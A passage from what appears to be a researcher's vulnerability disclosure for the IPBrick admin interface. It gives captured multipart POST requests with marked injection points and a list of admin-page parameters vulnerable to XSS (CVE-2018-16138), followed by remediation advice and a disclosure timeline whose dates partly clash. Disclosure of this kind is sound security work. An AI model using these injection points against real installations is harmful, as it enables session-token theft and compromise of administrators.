name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"pagina\"\x0d\x0a\x0d\x0awebmail_alterado\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"imap_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"smtp_server\"\x0d\x0a\x0d\x0aipbrick.domain.com\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"db_server\"\x0d\x0a\x0d\x0alocalhost\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"login_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"logo_patch\"; filename=\"\"\x0d\x0aContent-Type: application/octet-stream\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"can_export\"\x0d\x0a\x0d\x0at\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_users\"\x0d\x0a\x0d\x0a10000\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"admin_prefs\"\x0d\x0a\x0d\x0aadministrator\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_calendar_info\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_show_company_logo\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_hide_never\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"tb_plugin_recur_one_year_max\"\x0d\x0a\x0d\x0a0*\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_state\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_resource_users\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"resources_executing_interval\"\x0d\x0a\x0d\x0a2\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"lastrmt\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_name[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_doAction[1]\"\x0d\x0a\x0d\x0a1\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"event_type_action[1]\"\x0d\x0a\x0d\x0a\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"show_alt_emails\"\x0d\x0a\x0d\x0a0\x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"horde_signature\"\x0d\x0a\x0d\x0a  \x0d\x0a-----------------------------11122813211374287858922608002\x0d\x0aContent-Disposition: form-data; name=\"f_accao\"\x0d\x0a\x0d\x0aModify\x0d\x0a-----------------------------11122813211374287858922608002--\x0d\x0a
```

```
POST
https://ipbrick.domain.com/corpo.php
---------------------------9988894693323536491681056513
Content-Length: 540
-----------------------------9988894693323536491681056513
Content-Disposition: form-data; name="pagina"
voip_placas_pstn_inserir
-----------------------------9988894693323536491681056513
Content-Disposition: form-data; name="tipoplaca"
115561371*
-----------------------------9988894693323536491681056513
Content-Disposition: form-data; name="manufacturer"
6
-----------------------------9988894693323536491681056513
Content-Disposition: form-data; name="numportas"
1
-----------------------------9988894693323536491681056513--

```


```
POST
https://ipbrick.domain.com/corpo.php
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="pagina"
webmail_alterado
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="imap_server"
ipbrick.domain.com
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="smtp_server"
ipbrick.domain.com
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="db_server"
localhost
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="login_patch"; filename=""
Content-Type: application/octet-stream
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="logo_patch"; filename=""
Content-Type: application/octet-stream
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="can_export"
t
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="admin_users"
10000
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="admin_prefs"
administrator
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="tb_plugin_calendar_info"
1
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="tb_plugin_show_company_logo"
1*
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="tb_plugin_recur_hide_never"
0
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="tb_plugin_recur_one_year_max"
0
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="resources_executing_state"
0
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="resources_resource_users"
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="resources_executing_interval"
2
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="lastrmt"
1
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="event_type_name[1]"
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="event_type_doAction[1]"
1
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="event_type_action[1]"
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="show_alt_emails"
0
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="horde_signature"
-----------------------------11122813211374287858922608002
Content-Disposition: form-data; name="f_accao"
Modify
-----------------------------11122813211374287858922608002--

```

**CVE-2018-16138 (Cross-Site Scripting) XSS**

Another Vulnerability found was XSS in ALL THE ADMINISTRATION PAGE. Looks like they don't like to sanitize input. As seen on my other [post](http://www.cncs.pt) This vulnerability can be leveraged to inject JavaScript code and steam authentication tokens, as well as compromise clients if there is an exploit for their browser. Its consider a high severity vulnerability and should not be found in any application let alone one that handles the security of the whole enterprise.

Persistent and reflective XSS attacks can be made in this application, for example, for any chance if a user is registered using a payload it will present on the web page if consulting the user list. This is risky since any kind of problems could arise from it.

```
*List of detected XSS vulnerable inputs*

* /corpo.php?pagina=insere_licenca&activationcode=1ej5k3*sjnkukola1o&f_accao_file=Licence File
* /corpo.php?pagina=voip_asterisk_manager&alterar=*
* /corpo.php?pagina=voip_asterisk_manager&reload=1&alterar=*&activar=t
* /corpo.php?pagina=voip_options_alterar_altera&option=callcenter&in_estado_acd_remoto=t&in_ip_ACD=&in_suf_ACD=&status_send_queue_log=t&extra_send_queue_log_ip=*&extra_send_queue_log_port=&status_send_queue_log_share=t&extra_send_queue_log_share_ip=&extra_send_queue_log_share_folder=&extra_send_queue_log_share_login=admin&extra_send_queue_log_share_pwd=123456&extra_send_queue_log_share_period=1&extra_send_queue_log_share_hour=0&f_accao=Modify
* /corpo.php?pagina=voip_options_alterar_altera&option=callcenter&in_estado_acd_remoto=t&in_ip_ACD=&in_suf_ACD=&status_send_queue_log=t&extra_send_queue_log_ip=&extra_send_queue_log_port=&status_send_queue_log_share=t&extra_send_queue_log_share_ip=*&extra_send_queue_log_share_folder=&extra_send_queue_log_share_login=admin&extra_send_queue_log_share_pwd=123456&extra_send_queue_log_share_period=1&extra_send_queue_log_share_hour=0&f_accao=Modify
* /corpo.php?pagina=maquinas_inserir&f_type=1&f_nome=1&f_gidnumber=802&f_ip1=192&f_ip2=168&f_ip3=69&f_ip4=111&f_mac1=&f_mac2=&f_mac3=&f_mac4=&f_mac5=&f_mac6=*
* /corpo.php?pagina=show_log&file=*&file2=
* /corpo.php?pagina=show_log&file=system-1519780916.tgz&file2=*
* /corpo.php?pagina=manage_access_log_adv_alt&id_access=*
* /corpo.php?pagina=voip_options_alterar_altera&option=callcenter&in_estado_acd_remoto=t&in_ip_ACD=*&in_suf_ACD=&status_send_queue_log=t&extra_send_queue_log_ip=&extra_send_queue_log_port=&status_send_queue_log_share=t&extra_send_queue_log_share_ip=&extra_send_queue_log_share_folder=&extra_send_queue_log_share_login=admin&extra_send_queue_log_share_pwd=123456&extra_send_queue_log_share_period=1&extra_send_queue_log_share_hour=0&f_accao=Modify
* /corpo.php?pagina=voip_interface_pstn_inserir&nomeinterface=*&tipointerface=NT&opensippeers=0&rxgain=0&txgain=0&fqdn=&msip=&intechocancel=G
* /corpo.php?pagina=utilizador_ver_lista&offset=*&first_char=&pesq_nome=
* /corpo.php?pagina=utilizador_ver_lista&offset=*&first_char=&pesq_nome=
* /corpo.php?pagina=voip_options_alterar_altera&option=*&dnat=f&voip_public_ip_type_options=0&voip_public_ip_value1_options=&voip_listen_public_ip_type_options=0&voip_listen_public_ip_value1_options=10.0.0.253&int_voip=1&direct_rtp_setup=f&rmzero=f&contacts_server=local&cid_ldapsrv=127.0.0.1&cid_dnsdomain=domain.com&username_remote=admin&password_remote=123456&cid_search=f&cid_search_internal=f&address_restrict=f&voip_pbx_asterisk_answer=t&voip_att_timeout_options=30&voip_call_timeout_options=120&rtp_timeout=600&rtp_hold_timeout=700&agent_timeout_status=f&agent_timeout_extra=30&reg_expire_default=3600&reg_expire_max=3600&qualify_freq=60&reg_attempts=0&sip_videosupport=t&voipoptions_est_directory_users_ext=f&voipoptions_ext_directory_users_ext=*61&voipoptions_ext_directory_users_searchby=lastname&estatttransfer=f&extatttransfer=*1&estbldtransfer=f&extbldtransfer=#1&estado_pickup_ext=t&extra_pickup_ext=*8&estado_pickup_ext_grp=f&extra_pickup_ext_grp=*7&estado_pickup_ext_global=t&extra_pickup_ext_global=*8&extra_pickup_mode=1&estado_block_ext=f&extra_block_ext=*76&estado_unblock_ext_code=f&extra_unblock_ext_code=123456&estado_dnd_ena_ext=f&extra_dnd_ena_ext=*73&extra_dnd_dis_ext=*74&estado_cfw_all_ena_ext=f&extra_cfw_all_ena_ext=*70&estado_cfw_bsy_ena_ext=f&extra_cfw_bsy_ena_ext=*72&estado_cfw_noanw_ena_ext=f&extra_cfw_noanw_ena_ext=*71&estado_acfw_noanw_ena_ext=f&accao_acfw_noanw_ena_ext=0&extra_acfw_noanw_ena_ext=0&estado_retrydial_busy_ena_ext=f&extra_retrydial_busy_ena_ext=5&extra_retrydial_busy_timeout=60&extra_retrydial_busy_restrict=0&estado_barge_ext=f&extra_barge_ext=*9&estado_audio_recording_byphone=f&extra_audio_recording_byphone_seq=*60&extra_audio_recording_byphone_pinauth=&estado_callscreen_ext=f&extra_callscreen_ext=*64&moh_enable=f&id_moh=1&estado_callscreen_callerid_anonymous_ena=f&estado_callscreen_save_records=f&estado_callscreen_automatic_answer=f&prioritizacao=f&estado_recording_demand=f&estado_recording_cache=f&estado_adv_call_stats=f&conta_ftp=f&estado_voip_high_resolution_time=t&estado_dbreporting=f&extra_dbreporting=&ip_media=f&simetric_rtp=t&estado_chef_secretary=f&extra_chef_secretary=*79&forwarding_messages=t&dial_separator=#&estado_click2dial_msg=f&distinctive_ring=t&estado_password_policies=t&extra_password_policies=8&default_call_limit=2&addsipportscount=1&addsipports_0=5060&tls_port=5061&iax_port=4569&extra_udp_error_control=fec&estado_sip_tos=f&sip_tos_0=cs3&sip_tos_1=ef&sip_tos_2=af41&sip_tos_3=af41&estado_iax_tos=f&iax_tos_0=ef&estado_sip_cos=f&sip_cos_0=3&sip_cos_1=5&sip_cos_2=4&sip_cos_3=3&estado_iax_cos=f&iax_cos_0=5&extra_channel_tonezone=pt&f_accao=Modify&addsipports_=   (C'mon!! at least change this to post data!)
* /corpo.php?pagina=utilizador_ver_lista&offset=0&first_char=&pesq_nome=*
* /corpo.php?pagina=vpnssl_policies_ins&policy=*

* /manual/index.php?node=undefined&man_lang=*
* /manual/index.php?node=*&man_lang=undefined
```


Every input in this application should be sanitized to prevent exploitation of all these vulnerabilities and implement an antiCSRF token.

**Advisory Note**
If you look closely, you'll find that I skipped a lot of injection points. The reason is that I was fed up of discovering things. Sorry about that, but just choose a form and test it. There is a probability that has something wrong in it.

**TimeLine**

*29/08/18 - CVE Request

*30/08/2018 - Contacted IPBrick to send details

*25/10/2018 - No response from IPBrick

*06/11/2018 - Contacted CSIRT since several critical institutions were vulnerable

*14/11/2018 - Response from IPBrick stating they will analyze the incident

*03/12/2018 - Email sent, no updates on the matter

*20/01/2018 - Email sent, no updates on the matter

*26/12/2018 - Response stating that by the end of January a fix will be provided

*03/01/2019 - It's February, disclosing it